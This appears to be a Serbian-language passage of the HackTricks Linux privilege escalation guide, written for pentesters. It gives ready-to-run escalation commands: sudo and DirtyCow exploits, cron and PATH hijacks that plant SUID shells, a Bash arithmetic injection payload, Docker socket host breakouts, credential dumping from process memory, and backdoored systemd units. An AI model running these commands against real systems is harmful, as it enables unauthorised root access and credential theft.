# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### OS informacije

Počnimo da prikupimo informacije o operativnom sistemu koji je pokrenut.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Ako **imate dozvole za pisanje na bilo koji direktorijum unutar promenljive `PATH`**, možda ćete moći da preuzmete kontrolu nad nekim bibliotekama ili binarnim fajlovima:
```bash
echo $PATH
```
### Informacije o okruženju

Ima li interesantnih informacija, lozinki ili API ključeva u promenljivim okruženjima?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernel-a i da li postoji neki exploit koji se može koristiti za escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobru listu ranjivih kernel verzija i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi gde možete naći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive kernel verzije sa tog sajta možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretrazi kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokrenuti NA victim-u, proverava samo exploits za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**, možda je vaša verzija kernela napisana u nekom kernel exploit-u i tada ćete biti sigurni da je taj exploit validan.

Dodatna kernel exploitation tehnika:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Verzije Sudo pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju lokalnim neprivilegovanim korisnicima da eskaliraju privilegije na root koristeći sudo `--chroot` opciju kada se fajl `/etc/nsswitch.conf` koristi iz direktorijuma koji kontroliše korisnik.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita, uverite se da je vaša verzija `sudo` ranjiva i da podržava `chroot` funkcionalnost.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifikacija potpisa nije uspela

Pogledaj **smasher2 box of HTB** za **primer** kako se ova vuln može iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dalja enumeracija sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabroj moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite unutar docker container-a, možete pokušati da iz njega pobegnete:

{{#ref}}
docker-security/
{{#endref}}

## Pogoni

Proverite **what is mounted and unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount-ujete i proverite za privatne informacije
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni programi

Navedite korisne binarne datoteke
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proveri **da li je instaliran bilo koji compiler**. Ovo je korisno ako treba da koristiš neki kernel exploit, jer se preporučuje da ga compile-uješ na mašini na kojoj ćeš ga koristiti (ili na sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji stara Nagios verzija (na primer) koja bi mogla biti iskorišćena za escalating privileges…\
Preporučuje se ručno proveriti verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete takođe koristiti **openVAS** da proverite zastareli i ranjivi softver instaliran na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, zato se preporučuju aplikacije poput OpenVAS ili slične koje provere da li je neka instalirana verzija softvera ranjiva na poznate exploite_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebao** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Takođe **proverite vaše privilegije nad binarnim fajlovima procesa**, možda možete prepisati neki.

### Praćenje procesa

Možete koristiti alate kao što su [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Memorija procesa

Neki servisi na serveru čuvaju **credentials in clear text inside the memory**.\
Normalno će vam trebati **root privileges** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, stoga je ovo obično korisnije kada ste već root i želite otkriti više credentials.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuju kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuju **permisije svake mapirane regije**. Pseudo fajl **mem** **otkriva samu memoriju procesa**. Iz fajla **maps** znamo koje su **regije memorije čitljive** i njihove offsets. Koristimo ove informacije da **seek into the mem file and dump all readable regions** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` obezbeđuje pristup sistemskoj **fizičkoj** memoriji, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti pomoću /dev/kmem.\
Obično je `/dev/mem` čitljiv samo od strane **root** i **kmem** grupe.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump je Linux reinterpretacija klasičnog ProcDump alata iz Sysinternals paketa alata za Windows. Dostupan je na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti root zahteve i dump-ovati proces koji je u vašem vlasništvu
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je potreban)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da se proces authenticator izvršava:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete napraviti dump procesa (pogledajte prethodne sekcije da biste pronašli različite načine za dump memorije procesa) i pretražiti kredencijale unutar memorije:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti pristupne podatke u čistom tekstu iz memorije** i iz nekih **poznatih fajlova**. Za ispravno funkcionisanje zahteva root privilegije.

| Funkcija                                          | Ime procesa          |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)         | apache2              |
| OpenSSH (aktivne SSH sesije - upotreba sudo)      | sshd:                |

#### Pretraga regularnih izraza/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron jobs

### Crontab UI (alseambusher) pokrenut kao root – web-based scheduler privesc

Ako se web panel “Crontab UI” (alseambusher/crontab-ui) pokreće kao root i vezan je samo za loopback, i dalje mu možete pristupiti putem SSH local port-forwarding i kreirati privilegovan job za eskalaciju.

Tipičan lanac
- Otkrijte port dostupan samo na loopback-u (npr., 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađite kredencijale u operativnim artefaktima:
  - Backupi/skripte sa `zip -P <password>`
  - systemd unit koji otkriva `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Napravite tunel i prijavite se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj high-priv job i pokreni odmah (postavlja SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Ojačavanje
- Ne pokrećite Crontab UI kao root; ograničite ga posebnim korisnikom i minimalnim dozvolama
- Vežite na localhost i dodatno ograničite pristup putem firewall/VPN; ne koristite iste lozinke ponovo
- Izbegavajte ugradnju tajni u unit files; koristite secret stores ili root-only EnvironmentFile
- Omogućite audit/logging za on-demand job executions

Proverite da li je bilo koji zakazani zadatak ranjiv. Možda možete iskoristiti skriptu koju izvršava root (wildcard vuln? možete li izmeniti fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, у _/etc/crontab_ можете пронаћи PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju da korisnik "user" ima privilegije pisanja над /home/user_)

Ako у ovom crontabu root korisnik pokuša да izvrši neku команду или skriptu без постavljenog PATH-a. На пример: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ako se skripta izvršava kao root i sadrži “**\***” unutar neke naredbe, možete to iskoristiti da izazovete neočekivane posledice (npr. privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako wildcard prethodi putanji kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više wildcard exploitation trikova:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash izvršava parameter expansion i command substitution pre aritmetičke evaluacije u ((...)), $((...)) i let. Ako root cron/parser čita nepouzdana polja iz loga i ubacuje ih u aritmetički kontekst, napadač može injektovati command substitution $(...) koji se izvršava kao root kad cron pokrene skriptu.

- Zašto ovo funkcioniše: U Bash-u, expansions se dešavaju u ovom redosledu: parameter/variable expansion, command substitution, arithmetic expansion, zatim word splitting i pathname expansion. Dakle vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zameni (izvrši komandu), a preostali numerički `0` se koristi u aritmetici tako da skripta nastavi bez grešaka.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacija: Ubacite tekst koji kontroliše napadač u parsirani log tako da polje koje izgleda kao broj sadrži command substitution i završava cifrom. Osigurajte da vaša komanda ne ispisuje na stdout (ili preusmerite izlaz) tako da aritmetika ostane validna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako **možete izmeniti cron script** koji se izvršava kao root, vrlo lako možete dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako script koji izvršava root koristi **directory na kojem imate potpuni pristup**, možda bi bilo korisno obrisati taj folder i **napraviti symlink folder prema drugom** koji izvršava script pod vašom kontrolom
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Prilagođeno potpisani cron binarni fajlovi sa writable payloads
Blue teams ponekad "sign" cron-driven binarne fajlove tako što dump-uju prilagođenu ELF sekciju i grepuju za vendor string pre nego što ih izvrše kao root. Ako je taj binarni fajl group-writable (npr. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) i možete leakovati signing material, možete falsifikovati sekciju i preuzeti cron zadatak:

1. Koristite `pspy` da snimite tok verifikacije. U Era, root je pokrenuo `objcopy --dump-section .text_sig=text_sig_section.bin monitor` praćeno `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` i zatim je izvršio fajl.
2. Ponovo kreirajte očekivani sertifikat koristeći leaked key/config (iz `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Napravite zlonamerni zamenski fajl (npr. drop a SUID bash, dodajte vaš SSH key) i embed-ujte sertifikat u `.text_sig` tako da grep prođe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Prepišite zakazani binarni fajl pritom sačuvavši execute bitove:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Sačekajte sledeće cron pokretanje; kada naivna provera potpisa uspe, vaš payload će se pokrenuti kao root.

### Česti cron zadaci

Možete nadgledati procese kako biste pronašli one koji se izvršavaju svake 1, 2 ili 5 minuta. Možda možete to iskoristiti i eskalirati privilegije.

Na primer, da biste **nadgledali svakih 0.1s tokom 1 minute**, **sortirali po najmanje izvršenim komandama** i obrisali komande koje su se najviše izvršavale, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i ispisati svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je napraviti cronjob **stavljanjem carriage return-a nakon komentara** (bez newline karaktera), i cronjob će raditi. Primer (obratite pažnju na carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisivi _.service_ fajlovi

Proverite da li možete upisati neki `.service` fajl, ako možete, **možete ga izmeniti** tako da **izvršava** vaš **backdoor kada** je servis **pokrenut**, **restartovan** ili **zaustavljen** (možda ćete morati da sačekate restart mašine).\  
Na primer kreirajte vaš backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Upisivi binarni fajlovi servisa

Imajte na umu da ako imate **prava za upis nad binarnim fajlovima koje izvršavaju servisi**, možete ih promeniti u backdoors tako da kada se servisi ponovo pokrenu backdoors budu izvršeni.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** sa:
```bash
systemctl show-environment
```
Ako ustanovite da možete **write** u bilo kojoj fascikli u okviru te putanje, možda ćete moći **escalate privileges**. Potrebno je да tražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa**, као што су:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreiraj **izvršni fajl** sa **istim imenom kao binarni fajl na relativnoj putanji** unutar systemd PATH direktorijuma u koji možeš pisati, i kada se od servisa zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), tvoj **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu da pokrenu/zaustave servise, ali proveri da li možeš da koristiš `sudo -l`).

**Saznaj više o servisima pomoću `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd unit fajlovi čije ime se završava u `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa cronu jer imaju ugrađenu podršku za događaje bazirane na kalendarskom vremenu i monotoničke vremenske događaje i mogu se izvršavati asinhrono.

Možeš izlistati sve tajmere pomoću:
```bash
systemctl list-timers --all
```
### Tajmeri koji se mogu menjati

Ako možete izmeniti timer, možete naterati da izvrši neke postojeće jedinice systemd.unit (kao što su `.service` ili `.target`)
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Dakle, da biste zloupotrebili ovo dopuštenje biće vam potrebno:

- Pronađite neki systemd unit (npr. `.service`) koji **izvršava binarnu datoteku u koju možete pisati**
- Pronađite neki systemd unit koji **izvršava relativnu putanju** i nad kojim imate **writable privileges** over the **systemd PATH** (da biste imitirali taj izvršni fajl)

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

Da biste omogućili timer potrebna su vam root privileges i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Napomena: **timer** se **aktivira** kreiranjem simboličke veze ka njemu u `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketi

Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istoj ili različitim mašinama u client-server modelima. Koriste standardne Unix descriptor fajlove za komunikaciju između računara i konfigurišu se pomoću `.socket` fajlova.

Socket-i se mogu konfigurisati korišćenjem `.socket` fajlova.

**Više o socket-ima saznajte u `man systemd.socket`.** U okviru ovog fajla može se konfigurisati nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali u suštini služe da **naznače gde će socket slušati** (putanja AF_UNIX socket fajla, IPv4/6 adresa i/ili broj porta koji će se slušati, itd.)
- `Accept`: Prima boolean argument. Ako je **true**, za svaku dolaznu konekciju se **pokreće instanca servisa** i samo konekcioni socket se prosleđuje toj instanci. Ako je **false**, svi listening socket-i sami bivaju **prosleđeni pokrenutoj service unit-i**, i samo jedna service unit se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram socket-e i FIFO-e gde jedna service unit bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi, preporučuje se pisanje novih daemon-a na način pogodan za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prihvataju jednu ili više komandnih linija koje se **izvršavaju pre** odnosno **posle** kreiranja i bindovanja slušačkih **socket-a**/FIFO-a. Prvi token komandne linije mora biti apsolutna putanja do fajla, nakon čega slede argumenti procesa.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** odnosno **posle** zatvaranja i uklanjanja slušačkih **socket-a**/FIFO-a.
- `Service`: Specificira ime **service** unit-a koje će se **aktivirati** na **dolazni saobraćaj**. Ova opcija je dozvoljena samo za socket-e sa `Accept=no`. Podrazumevano se koristi service koji ima isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva nije potrebno koristiti ovu opciju.

### Writable .socket files

Ako pronađete **upisivi** `.socket` fajl, možete na početak `[Socket]` sekcije dodati nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će se izvršiti pre nego što se socket kreira. Stoga ćete **verovatno morati da sačekate ponovno pokretanje mašine.**\
_Imajte na umu da sistem mora koristiti tu konfiguraciju socket fajla ili backdoor neće biti izvršen_

### Writable sockets

Ako **identifikujete bilo koji upisivi socket** (_ovde govorimo o Unix Sockets, a ne o konfiguracionim `.socket` fajlovima_), onda **možete komunicirati** sa tim socket-om i možda iskoristiti neku ranjivost.

### Enumaracija Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer iskorišćavanja:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets listening for HTTP** zahteva (_Ne mislim na .socket files nego na datoteke koje se ponašaju kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovori na HTTP zahtev**, onda možete **komunicirati** sa njim i možda **iskoristiti neku ranjivost**.

### Upisivi Docker socket

Docker socket, često se nalazi na `/var/run/docker.sock`, je kritičan fajl koji treba zaštititi. Po defaultu, upisiv je za `root` i članove `docker` grupe. Imati write access na ovom socketu može dovesti do privilege escalation. Evo raspodele kako se ovo može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate write access na Docker socket, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande ti omogućavaju da pokreneš container sa root pristupom fajl sistemu hosta.

#### **Direktno korišćenje Docker API-ja**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Preuzmi listu dostupnih images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošalji zahtev za kreiranje containera koji montira root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristi `socat` da uspostaviš konekciju ka containeru, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možeš direktno izvršavati komande u containeru sa root pristupom fajl sistemu hosta.

### Ostalo

Imaj na umu da ako imaš write permissions nad docker socket-om zato što si **u grupi `docker`** imaš [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledaj **more ways to break out from docker or abuse it to escalate privileges** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ako ustanoviš da možeš koristiti **`ctr`** komandu, pročitaj sledeću stranicu jer je moguće da je možeš zloupotrebiti za eskalaciju privilegija:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ako ustanoviš da možeš koristiti **`runc`** komandu, pročitaj sledeću stranicu jer je moguće da je možeš zloupotrebiti za eskalaciju privilegija:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

